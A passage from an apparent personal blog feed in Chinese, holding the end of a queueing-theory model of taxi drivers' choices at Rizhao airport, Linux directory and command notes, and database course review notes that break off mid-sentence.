日照市国际航空港离港航班时刻统计图<p>显而易见的是，一天之内乘客到站时间并不是均匀分布，而是集中于几个时间段内，所以在不同时间情况下，司机做出决策应不同。</p><p>同时我们可以查询到，日照市机场大巴发车时刻表，根据相应数据做出折线图如下:</p><center><img src="D:\gitee-blog\source\_posts\数学建模\wps7.jpg" style="zoom:80%;" /> </center><center>图4-3 日照市机场大巴发车时刻表</center>日照市机场大巴发车时间安排集中于下午十三时至十五时与晚十七时至20时，结合航班到站时间发现，机场大巴到达时间相较于航班抵达时间高峰有一定迟滞性。结合实际情况，由于乘客下机后需办理行李提取、海关检疫等一系列手续，故乘客离开的高峰需顺延1至2小时。故出租车运营时间将有一定滞后性。<p>为了方便决策方案的给出，根据出港人流量和机场大巴时间安排的高峰、低谷，并结合实际情况将一天分为0至9时;9至13时;14时至15时;15至17时，17至20时；21时至0时数个时间段，具体划分方案如下:</p><p>0至9时与20时至0时，机场无航班进出不做考虑。9至13时与15至17时存在航班，机场大巴尚未开行，出租车运送乘客占比较高，14时至15时与17至20时机场大巴开行时间段，出租车运送乘客占比较低。</p><p>在司机接送旅客收入方面：日照市出租车执行的收费标准为：SP0+M(s)（S-2），即2公里内为起步价SP0， 超过两公里部分按里程的不同进行阶梯计价。</p><center><img src="D:\gitee-blog\source\_posts\数学建模\wps8.jpg" style="zoom:80%;" /> </center><center>图4-4 日照市机场与市区分布图</center>同时国内机场普遍离城市中心比较远，以日照市为例，日照市机场位于市区西南方向，距市区25至30公里。<h3 id="五、决策模型建立："><a href="#五、决策模型建立：" class="headerlink" title="五、决策模型建立："></a>五、决策模型建立：</h3><p>本题为决策问题,我们可以建立模型对司机进行决策的过程进行描述。</p><h4 id="5-1目标函数的建立"><a href="#5-1目标函数的建立" class="headerlink" title="5.1目标函数的建立"></a>5.1目标函数的建立</h4><p>设Z为司机通过决策也已获得的利润，可将某种决策下的利润P（profit）表示为:</p><center><img src="D:\gitee-blog\source\_posts\数学建模\wps9.jpg" style="zoom:100%;" /> </center>Q为决变量，决定了采取的决策，结合现实状况，出租车司机不可能同时空车返回市区和等待，Q的取值即为[0,1],若Q取1，代表等选择等待载客，Q=0则代表空载返回。P1、P2分别代表了(A)、(B)两方案的利润。如此规定后,便可以通过目标函数对利润Z求取最大值即可。<center><img src="D:\gitee-blog\source\_posts\数学建模\wps10.jpg" style="zoom:100%;" /></center>#### 5.2所有可能情况的阐释<p>由此可以得出影响司机决策的因素有:载客的利润期望、空载返回的时间以及消耗、市区载客的预期利润。对这些因素继续进行具体分析，可以发现司机的决策实际上由多个要素共同决定:排队车辆数N（t）、返回路程S，收费标准M(S)、当前时间段内抵达机场的航班数量N、等待载客的时间成本（TS）。其中，排队车辆数M和机场返回市区乘客数量N，决定了等待时间T，返回路程和收费标准共同影响了载客利润P1。另外返回路程还制约了空载损耗的大小，收费标准还决定了司机在市区的收益。</p><h5 id="5-2-1基于排队载客的模型建立："><a href="#5-2-1基于排队载客的模型建立：" class="headerlink" title="5.2.1基于排队载客的模型建立："></a>5.2.1基于排队载客的模型建立：</h5><p>基于排队载客P1，其收益为收入减去成本，此处的成本包括时间成本及载客过程中油耗和过路费等。在一般情况下过路费包含在乘客付款中可以忽略不计。</p><center><img src="D:\gitee-blog\source\_posts\数学建模\wps11.jpg" style="zoom:100%;" /> </center>由于阶梯计价的计价策略，载客收入W1为分段函数，在起步距离S0以内部分收费SP0，以外部分采取阶梯计价可表示为：<center><img src="D:\gitee-blog\source\_posts\数学建模\wps12.jpg" style="zoom:100%;" /> </center>在此表达式中等待载客的时间成本TS1，可以看做等待时间与单位时间下的平均收益的比值。<p>设司机的单位时间平均收入为ρ，T为等候载客的时间。</p><center><img src="D:\gitee-blog\source\_posts\数学建模\wps13.jpg" style="zoom:100%;" /> </center>再此基础上，出租车在机场排队可能等待时间T，取决于不同时段航班的到达规律、出租车的排队数量。由于不同时间阶段下，等待载客的时间T存在较大波动<p>在前文的样例分析中，可知不同时间段乘坐公交车的乘客数，占航班总旅客数的占比是不同的,不妨设在在无机场大巴时总客流量与乘坐出租车旅客数比例为C1，当机场大巴正常运行时总客流量与乘坐出租车旅客数比例为C2</p><center><img src="D:\gitee-blog\source\_posts\数学建模\wps14.jpg" style="zoom:100%;" /> </center><img src="D:\gitee-blog\source\_posts\数学建模\wps15.jpg" style="zoom:100%;" />表示机场一时间阶段内抵达的乘客，由假设中设忽略国内航班与国际航班及不同客机型号载客量的差异，设k为航班的平均载客数，有如下判断：<center><img src="D:\gitee-blog\source\_posts\数学建模\wps16.jpg" style="zoom:100%;" /> </center>**等待时间T的确定：**<p>旅客乘坐飞机到达空港客运交通枢纽的集聚规律服从泊松分布[1],设出租车到达率同样服从Poisson分布，由排队论可知，当输入过程为泊松流时，车辆到达的时间间隔服从负指数分布</p><p>平均服务率，设置机场存在c个上车点，每辆车接受服务的平均时间记为µ0，接受服务的时间服从正态分布。其中每辆车接受服务的平均时间记为µ0,可视为常量。</p><p>当乘车人数时可以认为乘车人数足够多，只需要考虑每辆车的接受服务时间</p><center><img src="D:\gitee-blog\source\_posts\数学建模\wps22.jpg" style="zoom:100%;" /> </center>N0表示每小时内有多少辆车接受服务<p>当乘车人数时,在排队过程中，必然出行在队首车辆会进入等待，设此时的额外等待时间为，</p><center><img src="D:\gitee-blog\source\_posts\数学建模\wps25.jpg" style="zoom:100%;" /> </center>则平均服务率为<center><img src="D:\gitee-blog\source\_posts\数学建模\wps26.jpg" style="zoom:100%;" /></center>当成等待区乘客数量稳定时，由排队论可知，系统此时满足M/M/C/∞/∞/FCFS的状况。它表示：在a个服务台与先到先服务前提下，车站蓄车池容量无限与到站客源无限，出租车到达相互独立，且服从参数为λ的泊松分布；同时，出租车的服务时间服从参数为µ的负指数分布。其中，λ表示单位时刻出租车到达的数量，Ε(t)表示系统的平均服务率，即单位时间内离开排队池的出租车数量。<p>则服务强度为：</p><center><img src="D:\gitee-blog\source\_posts\数学建模\wps29.jpg" style="zoom:100%;" /> </center>系统平均等待车辆数LQ<center><img src="D:\gitee-blog\source\_posts\数学建模\wps30.jpg" style="zoom:100%;" /> </center>由上式：令n`=n-c对应公式经化简可得：<center><img src="D:\gitee-blog\source\_posts\数学建模\wps31.jpg" style="zoom:100%;" /> </center>蓄车池空闲概率P0:<center><img src="D:\gitee-blog\source\_posts\数学建模\wps32.jpg" style="zoom:100%;" /> </center>由Little公式，得司机平均等待时间为:<center><img src="D:\gitee-blog\source\_posts\数学建模\wps33.jpg" style="zoom:100%;" /> </center>则每辆出租车的逗留时间为：<center><img src="D:\gitee-blog\source\_posts\数学建模\wps34.jpg" style="zoom:100%;" /> </center>##### 5.2.2基于返回拉客的模型建立:<p>基于返回拉客P2，其收益为收入减去成本，此处的成本包含，由机场返回市中心的折算时间成本，空载返回产生油耗等。</p><p>假设司机选择空载返回市区接客，假设市区乘客数量足够，即不需要在市区等待乘客，此时预期能获得的收益W2为选择在飞机场排队载客时的时间成本。</p><center><img src="D:\gitee-blog\source\_posts\数学建模\wps35.jpg" style="zoom:100%;" /> <center>由于在不同城市，城市规划及市区发展的现实不同，不妨设从机场到达市中心的距离为L，城区半径为r,则任一乘客搭乘出租车返回市区的距离S服从N(L,r2),所以可设<p>为空载返回时的损失。故出租车从机场载客返回市区总收益为：节约排队载客的时间成本与空载返回产生油耗过路费等损耗与返程中的时间成本之差。</p><p>综上所述：</p><center><img src="D:\gitee-blog\source\_posts\数学建模\wps37.jpg" style="zoom:100%;" /> </center>折算的时间成本TS2可以表示为： <p>其中V为出租车行驶的平均速度，ρ为司机的单位时间平均收入 </p><center><img src="D:\gitee-blog\source\_posts\数学建模\wps40.jpg" style="zoom:100%;" /> <center><h4 id="5-3决策模型："><a href="#5-3决策模型：" class="headerlink" title="5.3决策模型："></a>5.3决策模型：</h4><p>从模型中得到的Q即为推荐司机选择排队的概率，其取值范围为[0, 1]。Q越大，更推荐司机选择在排队区等待，反之则是空载，具体如下： </p><p>(1)，司机最好选择在排队区等待，此时排队预期平均收益高于空载返回的预期收益。</p><p>(2) P &lt; 0.5，司机最好选择空载返回，此时排队预期平均收益低于空载返回的预期收益。</p><h3 id="六、选择模型的检验与合理性分析"><a href="#六、选择模型的检验与合理性分析" class="headerlink" title="六、选择模型的检验与合理性分析"></a>六、选择模型的检验与合理性分析</h3><p>在前面的样例分析阶段的研究中，探讨了日照市机场的相关信息，接下来将以日照市为例对模型进行检验和合理性分析。</p><p>中心商务区（CBD）是指一个城市里主要商业活动进行的地区同时也是市中心，在日照市我们可以将万达及华润万象汇所在的区域定义为日照市的中心商务区。</p><center><img src="D:\gitee-blog\source\_posts\数学建模\wps43.jpg" style="zoom:100%;" /> </center><center>图6-1 出租车路线规划图</center><center><img src="D:\gitee-blog\source\_posts\数学建模\wps44.jpg" style="zoom:100%;" /> </center>通过百度地图可查，由日照山字河国际机场到市中心依路线不同，其距离为29±3公里，即如此可以确定路程L=29，市区范围R=3，返回市区的平均时间t约为41分钟。并结合收费标准得到载客回市区收益W1，带入数据得。<center>W1=57.62</center>考虑到空载和载人对汽车油耗影响较小，可以忽略不计，由于日照市出租车车型并不统一，此处采用可查数据中出现的大众捷达车型，油耗为5.7L/100km，目前国内油价为8.43元/L。可以计算：<center><img src="D:\gitee-blog\source\_posts\数学建模\wps45.jpg" style="zoom:100%;" /> </center>同时通过找工易平台获取信息为，山东省出租车司机的平均薪资为11479元/月，出租车司机工作时间为11个小时，每个月休息2天，如此可以推算日照市出租车司机在市中心每小时的利润为:<center><img src="D:\gitee-blog\source\_posts\数学建模\wps46.jpg" style="zoom:100%;" /> </center>可以计算出租车司机空载返回时的时间成本为： <p>同时日照市机场作为中小型机场，其到站客流波动较大，结合上文分析可粗略估计在无机场大巴时总客流量与乘坐出租车旅客数比例为C1=0.32，当机场大巴正常运行时总客流量与乘坐出租车旅客数比例为C2=0.22，结合航班到站时间有：</p><table><thead><tr><th></th><th>9至13时</th><th>13至15时</th><th>15至16时</th><th>16至17时</th><th>17至18时</th><th>18至20时</th><th>20至21时</th><th>21时至次日9时</th></tr></thead><tbody><tr><td>平均打车数</td><td>56</td><td>27.5</td><td>0</td><td>148</td><td>66</td><td>11</td><td>64</td><td>0</td></tr><tr><td>平均服务率</td><td>80</td><td>43.64</td><td></td><td>80</td><td>80</td><td>70.9</td><td>80</td><td></td></tr></tbody></table><p>表6-1 日照市国际机场不同时间段的平均打车数即平均服务率统计表</p><p>由山东省公共数据公开网可以查询到日照市交通运输局发布的日照市市直出租车信息汇总，日照市市区共有出租车969辆。由于部分关键数据缺失，这里采用其他城市数据进行估算，设λ=42，为90s，设日照市机场服务台数为2。</p><p>平均服务率可同时求出，以标记正在上表中</p><p>当在13-16时，18至20时，21时至次日9时三个时间段内，乘客数量小于到达的车辆数量，则平均服务率为以13-16时为例</p><p>E(t)=43.64带入公式</p><center><img src="D:\gitee-blog\source\_posts\数学建模\wps50.jpg" style="zoom:100%;" /> <center><center><img src="D:\gitee-blog\source\_posts\数学建模\wps51.jpg" style="zoom:100%;" /> </center><center><img src="D:\gitee-blog\source\_posts\数学建模\wps52.jpg" style="zoom:100%;" /> </center>此时Wq远大于，可以忽略不计<center><img src="D:\gitee-blog\source\_posts\数学建模\wps54.jpg" style="zoom:100%;" /> <center><p>此时，结果为负，=47.902，应选择空载返回市区。</p><p>同理当其余时间段，乘客数量大于到达的车辆数量，则平均服务率为<img src="file:///C:\Users\888888\AppData\Local\Temp\ksohtml9260\wps57.jpg" alt="img">，易证此时P1&gt;P2应选择排队载客。</p><p>综上所述对于日照市机场有以下判断：</p><table><thead><tr><th align="center">时间</th><th align="center">13-16时，18至20时，21时至次日9时</th><th align="center">9至13时，16至18时，20至21时</th></tr></thead><tbody><tr><td align="center">司机选择</td><td align="center">返回拉客</td><td align="center">等待载客</td></tr></tbody></table><p>表6-2 针对日照市特点下不同时间段预测数据</p><p>在不同时间阶段下，模型能够做出不同判断，保证出租车司机的利益最大化，可以证明模型具有合理性。</p><h3 id="七、-模型改进方向"><a href="#七、-模型改进方向" class="headerlink" title="七、 模型改进方向"></a>七、 模型改进方向</h3><p>在本题中，选择机场为中小型机场在模拟过程中航班到达量不同时间段内，波动较大。同时在模型检验和合理性分析阶段，因为部分条件获取难度较大采取使用其他数据进行估计，并不能保证完全准确。在估计机场乘客数的推断中，在模型建立之初故意选择性的忽视了不同航班载客量的差异，将其视为相同参数，若将其进行妥善分析能进一步提高模型的准确率与可靠性。</p><p>参考文献</p><p>[1]何汉.大型空港客运交通枢纽客流集散规律研究.铁道运输与经济. 2019.04.17</p>]]></content>
      
      
      <categories>
          
          <category> 个人 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 数学建模 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux操作系统</title>
      <link href="/2022/08/03/Linux%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"/>
      <url>/2022/08/03/Linux%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/</url>
      
        <content type="html"><![CDATA[<h1 id="Linux操作系统"><a href="#Linux操作系统" class="headerlink" title="Linux操作系统"></a>Linux操作系统</h1><p>[TOC]</p><blockquote><p>因为使用的方便，实际上还是使用的带有图形化界面的linux操作系统，虽然理论上不带图形化界面的更能增长技术，但是过于复杂，所以更多还是使用图形化界面的…….</p></blockquote><h2 id="Linux-系统目录结构"><a href="#Linux-系统目录结构" class="headerlink" title="Linux 系统目录结构"></a>Linux 系统目录结构</h2><p><strong>/bin</strong>：bin 是 Binaries的缩写, 这个目录存放着最经常使用的命令。</p><p><strong>/boot：</strong>这里存放的是启动 Linux 时使用的一些核心文件，包括一些连接文件以及镜像文件。</p><p><strong>/dev ：</strong>dev 是 Device的缩写, 该目录下存放的是 Linux 的外部设备，在 Linux 中访问设备的方式和访问文件的方式是相同的。</p><p><strong>/etc：</strong>etc 是 Etcetera的缩写,这个目录用来存放所有的系统管理所需要的配置文件和子目录。</p><p><strong>/home</strong>：用户的主目录，在 Linux 中，每个用户都有一个自己的目录，一般该目录名是以用户的账号命名的</p><p><strong>/lib</strong>：lib 是 Library(库) 的缩写这个目录里存放着系统最基本的动态连接共享库，其作用类似于 Windows 里的 DLL 文件。几乎所有的应用程序都需要用到这些共享库。</p><p><strong>/lost+found</strong>：这个目录一般情况下是空的，当系统非法关机后，这里就存放了一些文件。</p><p><strong>/media</strong>：linux 系统会自动识别一些设备，例如U盘、光驱等等，Linux 会把识别的设备挂载到这个目录下。</p><p><strong>/mnt</strong>：系统提供该目录是为了让用户临时挂载别的文件系统的，我们可以将光驱挂载在 /mnt/ 上，然后进入该目录就可以查看光驱里的内容了。</p><p><strong>/opt</strong>：opt 是 optional(可选) 的缩写，这是给主机额外安装软件所摆放的目录。比如你安装一个ORACLE数据库则就可以放到这个目录下。默认是空的。</p><p><strong>/proc</strong>：proc 是 Processes(进程) 的缩写，/proc 是一种伪文件系统（也即虚拟文件系统），存储的是当前内核运行状态的一系列特殊文件，这个目录是一个虚拟的目录，它是系统内存的映射，我们可以通过直接访问这个目录来获取系统信息。<br>这个目录的内容不在硬盘上而是在内存里，我们也可以直接修改里面的某些文件，比如可以通过下面的命令来屏蔽主机的ping命令，使别人无法ping你的机器：</p><pre class="line-numbers language-none"><code class="language-none">echo 1 &gt; &#x2F;proc&#x2F;sys&#x2F;net&#x2F;ipv4&#x2F;icmp_echo_ignore_all<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>/root</strong>：该目录为系统管理员，也称作超级权限者的用户主目录。</p><p><strong>/sbin</strong>：s 就是 Super User 的意思，是 Superuser Binaries (超级用户的二进制文件) 的缩写，这里存放的是系统管理员使用的系统管理程序。</p><p><strong>/selinux</strong>： 这个目录是 Redhat/CentOS 所特有的目录，Selinux 是一个安全机制，类似于 windows 的防火墙，但是这套机制比较复杂，这个目录就是存放selinux相关的文件的。</p><p><strong>/srv</strong>： 该目录存放一些服务启动之后需要提取的数据。</p><p><strong>/sys</strong>：这是 Linux2.6 内核的一个很大的变化。该目录下安装了 2.6 内核中新出现的一个文件系统 sysfs 。</p><p>sysfs 文件系统集成了下面3种文件系统的信息：针对进程信息的 proc 文件系统、针对设备的 devfs 文件系统以及针对伪终端的 devpts 文件系统。</p><p>该文件系统是内核设备树的一个直观反映。</p><p>当一个内核对象被创建的时候，对应的文件和目录也在内核对象子系统中被创建。</p><p><strong>/tmp</strong>：tmp 是 temporary(临时) 的缩写这个目录是用来存放一些临时文件的。</p><p><strong>/usr</strong>： usr 是 unix shared resources(共享资源) 的缩写，这是一个非常重要的目录，用户的很多应用程序和文件都放在这个目录下，类似于 windows 下的 program files 目录。</p><p><strong>/usr/bin：</strong>系统用户使用的应用程序。</p><p><strong>/usr/sbin：</strong>超级用户使用的比较高级的管理程序和系统守护程序。</p><p><strong>/usr/src：</strong>内核源代码默认的放置目录。</p><p><strong>/var</strong>：var 是 variable(变量) 的缩写，这个目录中存放着在不断扩充着的东西，我们习惯将那些经常被修改的目录放在这个目录下。包括各种日志文件。</p><p><strong>/run</strong>：是一个临时文件系统，存储系统启动以来的信息。当系统重启时，这个目录下的文件应该被删掉或清除。如果你的系统上有 /var/run 目录，应该让它指向 run。</p><p>在 Linux 系统中，有几个目录是比较重要的，平时需要注意不要误删除或者随意更改内部文件。</p><p><strong>/etc</strong>： 上边也提到了，这个是系统中的配置文件，如果你更改了该目录下的某个文件可能会导致系统不能启动。</p><p><strong>/bin, /sbin, /usr/bin, /usr/sbin</strong>: 这是系统预设的执行文件的放置目录，比如 <strong>ls</strong> 就是在 <strong>/bin/ls</strong> 目录下的。</p><p>值得提出的是 <strong>/bin</strong>、**/usr/bin** 是给系统用户使用的指令（除 root 外的通用用户），而/sbin, /usr/sbin 则是给 root 使用的指令。</p><p><strong>/var</strong>： 这是一个非常重要的目录，系统上跑了很多程序，那么每个程序都会有相应的日志产生，而这些日志就被记录到这个目录下，具体在 /var/log 目录下，另外 mail 的预设放置也是在这里。</p><hr><h2 id="Linux-文件基本属性"><a href="#Linux-文件基本属性" class="headerlink" title="Linux 文件基本属性"></a>Linux 文件基本属性</h2><p>在 Linux 中我们通常使用以下两个命令来修改文件或目录的所属用户与权限：</p><ul><li>chown (change owner) ： 修改所属用户与组。</li><li>chmod (change mode) ： 修改用户的权限。</li></ul><p>在 Linux 中我们可以使用 <strong>ll</strong> 或者 <strong>ls –l</strong> 命令来显示一个文件的属性以及文件所属的用户和组</p><pre class="line-numbers language-none"><code class="language-none">在 Linux 中第一个字符代表这个文件是目录、文件或链接文件等等。当为 d 则是目录当为 - 则是文件；若是 l 则表示为链接文档(link file)；若是 b 则表示为装置文件里面的可供储存的接口设备；若是 c 则表示为装置文件里面的串行端口设备，例如键盘、鼠标接下来的字符中，以三个为一组，且均为rwx的三个参数的组合。r代表可读(read)、w代表可写(write)、x代表可执行(execute)如果没有权限，就会出现减号-  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>第0位确定文件类型，第1-3位确定该文件的所有者拥有该文件的权限。第4-6位确定属组(所有者的同组用户)拥有该文件的权限，第7-9位确定其他用户拥有该文件的权限</p><h3 id="Linux文件属主和属组"><a href="#Linux文件属主和属组" class="headerlink" title="Linux文件属主和属组"></a>Linux文件属主和属组</h3><blockquote><p>对于文件来说，它都有一个特定的所有者，也就是对该文件具有所有权的用户,同时在Linux系统中，用户是按组分类的，一个用户属于一个或多个组。<br>文件所有者以外的用户又可以分为文件所属组的同组用户和其他用户。因此，Linux系统按文件所有者、文件所有者同组用户和其他用户来规定了不同的文件访问权限。<br>对于root用户来说，一般情况下，文件的权限对其不起作用。</p></blockquote><h2 id="Linux-文件与目录管理"><a href="#Linux-文件与目录管理" class="headerlink" title="Linux 文件与目录管理"></a>Linux 文件与目录管理</h2><h3 id="处理目录的常用命令："><a href="#处理目录的常用命令：" class="headerlink" title="处理目录的常用命令："></a>处理目录的常用命令：</h3><ul><li><p>ls: 列出目录及文件名</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token function">ls</span> <span class="token punctuation">[</span>-aAdfFhilnrRSt<span class="token punctuation">]</span> 目录名称<span class="token function">ls</span> <span class="token punctuation">[</span>--color<span class="token operator">=</span><span class="token punctuation">&#123;</span>never,auto,always<span class="token punctuation">&#125;</span><span class="token punctuation">]</span> 目录名称<span class="token function">ls</span> <span class="token punctuation">[</span>--full-time<span class="token punctuation">]</span> 目录名称<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><ul><li><p>-a ：全部的文件，连同隐藏文件( 开头为 . 的文件) 一起列出来(常用)</p></li><li><p>-d ：仅列出目录本身，而不是列出目录内的文件数据(常用)</p></li><li><p>-l ：长数据串列出，包含文件的属性与权限等等数据；</p><blockquote><p> 将当前目录下的所有文件列出来(含属性与隐藏档) </p></blockquote></li></ul></li><li><p>cd：切换目录</p><blockquote><p>cd是Change Directory的缩写，这是用来变换工作目录的命令。</p></blockquote><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token builtin class-name">cd</span> <span class="token punctuation">[</span>相对路径或绝对路径<span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p>cd命令的其他用法</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token builtin class-name">cd</span> ~  <span class="token comment">#表示回到自己的家目录，亦即是 /root 这个目录</span><span class="token builtin class-name">cd</span> <span class="token punctuation">..</span> <span class="token comment">#表示去到目前的上一级目录</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></blockquote></li><li><p>pwd：显示目前的目录</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token builtin class-name">pwd</span> <span class="token punctuation">[</span>-P<span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>参数：**-P** ：显示出确实的路径，而非使用连结 (link) 路径。</p></li><li><p>mkdir：创建一个新的目录</p><pre class="line-numbers language-none"><code class="language-none">mkdir [-mp] 目录名称<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>选项与参数：</p><ul><li>-m ：配置文件的权限喔！直接配置，不需要看默认权限 (umask) 的脸色～</li><li>-p ：帮助你直接将所需要的目录(包含上一级目录)递归创建起来！</li></ul></li><li><p>rmdir：删除一个空的目录</p><pre class="line-numbers language-none"><code class="language-none">rmdir [-p] 目录名称<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>选项与参数：</p><ul><li><strong>-p ：</strong>从该目录起，一次删除多级空目录</li></ul></li><li><p>cp: 复制文件或目录</p></li><li><p>rm: 删除文件或目录</p></li><li><p>mv: 移动文件与目录，或修改文件与目录的名称</p></li></ul>]]></content>
      
      
      <categories>
          
          <category> 学习笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 学习记录 </tag>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>数据库复习资料整理</title>
      <link href="/2022/07/15/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%86%85%E5%AE%B9%E6%95%B4%E7%90%86/"/>
      <url>/2022/07/15/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%86%85%E5%AE%B9%E6%95%B4%E7%90%86/</url>
      
        <content type="html"><![CDATA[<h1 id="数据库复习资料整理"><a href="#数据库复习资料整理" class="headerlink" title="数据库复习资料整理"></a>数据库复习资料整理</h1><p>[TOC]</p><h2 id="第1章-数据库概述"><a href="#第1章-数据库概述" class="headerlink" title="第1章  数据库概述"></a>第1章  数据库概述</h2><h3 id="1-1-数据与信息"><a href="#1-1-数据与信息" class="headerlink" title="1.1 数据与信息"></a>1.1 数据与信息</h3><p>**数据(Data)**是描述事物的符号记录，是信息的符号表示或载体，也是数据库中存储的基本对象，数据描述现实世界中各种具体事物或抽象概念的、可存储并具有明确意义的符号记录。</p><p>数据本身无意义，具有客观性，经过解释才能表示一定的意义。数据的含义是对数据的解释，称为数据的语义，数据与其语义是不可分的</p><p><strong>信息（Information）</strong>是数据的内涵，是数据的语义解释。</p><h3 id="1-2-数据管理技术的发展"><a href="#1-2-数据管理技术的发展" class="headerlink" title="1.2 数据管理技术的发展"></a>1.2 数据管理技术的发展</h3><h4 id="人工管理阶段"><a href="#人工管理阶段" class="headerlink" title="人工管理阶段"></a>人工管理阶段</h4><blockquote><p>时期:40年代中–50年代中<br>应用需求：科学计算          硬件水平：无直接存取存储设备     软件水平：没有操作系统      处理方式：批处理</p><p>人工管理阶段的特点：数据不保存，应用程序管理数据，数据不共享，数据不具有独立性</p></blockquote><h4 id="文件管理阶段"><a href="#文件管理阶段" class="headerlink" title="文件管理阶段"></a>文件管理阶段</h4><blockquote><p>时期:50年代末–60年代中<br>应用需求:科学计算、管理   硬件水平:磁盘、磁鼓   软件水平:有文件系统      处理方式:联机实时处理、批处理</p><p>文件管理阶段的特点：数据以文件的形式长期保存在外存储器中数据独立性差，由文件系统对数据进行管理，数据共享性差，冗余度大，数据独立性差。</p></blockquote><h4 id="数据库管理阶段"><a href="#数据库管理阶段" class="headerlink" title="数据库管理阶段"></a>数据库管理阶段</h4><blockquote><p>时期:60年代末以来<br>背景:大规模管理  硬件背景:大容量磁盘 软件背景:有数据库管理系统  处理方式:联机实时处理,分布处理,批处理</p><p>数据库管理系统阶段的特点： 数据结构化，数据的共享性高，冗余度低，易扩充，数据独立性高，数据由DBMS统一管理和控制</p></blockquote><h3 id="1-3-数据库系统的基本概念"><a href="#1-3-数据库系统的基本概念" class="headerlink" title="1.3 数据库系统的基本概念"></a>1.3 数据库系统的基本概念</h3><p>**数据库(Database，DB)**是长期储存在计算机内、有组织的、可共享的大量数据的集合</p><blockquote><p>数据库的基本特征<br>数据按一定的数据模型组织、描述和储存，冗余度较小，数据独立性较高，易扩展，可为各种用户共享</p></blockquote><p>**数据库管理系统(DataBase Management System, DBMS)**：是数据库系统的核心，位于用户与操作系统之间的一层数据管理软件</p><blockquote><p>DBMS的主要功能包括：<br>数据定义功能，数据操纵功能，数据组织、存储和管理，数据库运行管理，数据库的建立和维护功能</p></blockquote><p>**数据库系统(DataBase System， DBS)**是指在计算机系统中引入数据库后的系统。</p><h3 id="1-4-数据模型"><a href="#1-4-数据模型" class="headerlink" title="1.4 数据模型"></a>1.4 数据模型</h3><h4 id="三个世界的划分"><a href="#三个世界的划分" class="headerlink" title="三个世界的划分"></a>三个世界的划分</h4><pre class="line-numbers language-none"><code class="language-none">为了把现实世界中的具体事物抽象、组织为某一DBMS支持的数据模型，首先将现实世界的事物及其联系进行特征抽取，形成信息世界的概念模型，这种模型不依赖于具体的计算机系统，然后再将概念模型转换为某一DBMS所支持的逻辑模型和物理模型。<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol><li>现实世界 现实世界即客观存在的世界</li><li>信息世界是现实世界在人们头脑中的反映，经过人脑的分析、归纳、抽象，形成信息，把这些信息进行记录、整理、归类和格式化后，就构成了信息世界。<ul><li>实体（Entity）：客观存在并且可以相互区分的事物称为实体</li><li>属性（Attribute）：实体所具有的某一特性称为属性</li><li>码（Key）：能唯一标识实体的属性或属性的组合称为码，也称为键</li><li>域（Domain）：属性的取值范围称为该属性的域</li><li>实体型（Entity Type）：用实体名及其所有属性的集合来描述同类实体，称为实体型</li><li>实体集（Entity Set）：同一类型实体的集合称为实体集</li><li>联系<ul><li>一对一联系（1:1）如果对于实体集E1中的每一个实体，实体集E2中至多有一个（也可以没有）实体与之联系，反之亦然，则称实体集E1与实体集E2具有一对一联系，记为1:1</li><li>一对多联系（1:n）如果对于实体集E1中的每一个实体，实体集E2中至多有n个实体（n≥0）与之联系；反之，对于实体集E2中的每一个实体，实体集E1中至多有一个实体与之联系，则称实体集E1与实体集E2具有一对多联系，记为1:n。</li><li>多对多联系（m:n）如果对于实体集E1中的每一个实体，实体集E2中有n个实体（n≥0）与之联系，反之，对于实体集E2中的每一个实体，实体集E1中也有m个实体（m≥0）与之联系，则称实体集E1与实体集E2具有多对多联系，记为m:n</li></ul></li></ul></li><li>机器世界是信息世界中信息的数据化，就是将信息用字符和数值等数据表示，便于存储在计算机中，并由计算机进行识别和处理<ul><li>文件（file）：同一类记录的集合称为文件，文件是用来描述实体集的</li><li>关键字（key）：能唯一标识文件中每条记录的字段或字段集，称为记录的关键字，或者简称为键。</li></ul></li></ol><h4 id="E-R图的相关信息"><a href="#E-R图的相关信息" class="headerlink" title="E-R图的相关信息"></a>E-R图的相关信息</h4><p>概念模型是对信息世界的建模，它能方便、准确地描述信息世界中的概念。</p><p>概念模型有很多表示方法，其中最著名、最常用的是P.P.S.Chen于1976年提出的实体－联系方法，也称为实体－联系模型，该方法用E-R图来表示实体、属性以及实体间的联系。</p><blockquote><ol><li>实体用矩形表示，矩形框内写明实体名</li><li>属性用椭圆形表示，并用无向边将其与相应的实体连接起来</li><li>联系用菱形表示，菱形框内写明联系名，并用无向边分别与有关实体连接起来，同时在无向边旁标上联系的类型（1:1、1:n或m:n）</li><li>联系也可能有属性，联系的属性用椭圆形表示，并用无向边与该联系连接起来。</li><li>一对一联系（1:1）如果对于实体集E1中的每一个实体，实体集E2中至多有一个（也可以没有）实体与之联系，反之亦然，则称实体集E1与实体集E2具有一对一联系，记为1:1</li><li>一对多联系（1:n）如果对于实体集E1中的每一个实体，实体集E2中至多有n个实体（n≥0）与之联系；反之，对于实体集E2中的每一个实体，实体集E1中至多有一个实体与之联系，则称实体集E1与实体集E2具有一对多联系，记为1:n。</li><li>多对多联系（m:n）如果对于实体集E1中的每一个实体，实体集E2中有n个实体（n≥0）与之联系，反之，对于实体集E2中的每一个实体，实体集E1中也有m个实体（m≥0）与之联系，则